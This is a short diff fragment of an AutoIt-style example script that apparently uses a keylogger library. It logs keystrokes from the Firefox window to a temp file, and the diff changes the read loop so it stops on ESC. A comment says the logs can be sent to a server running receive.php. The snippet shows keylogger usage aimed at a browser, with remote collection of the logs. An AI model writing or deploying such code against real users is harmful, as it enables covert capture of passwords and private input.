@@ -14,8 +14,8 @@ _initWithFilename(@TempDir, "keylog-output")
 _logWindow("Firefox")
 
 ; With the _read()-function you can make your own conditional loops
-While 1
-  If <CONDITION> Then _read()
+While not $key == "ESC"
+  _read()
 WEnd
 
 ; You can send your logs to a server. The server has to run receive.php
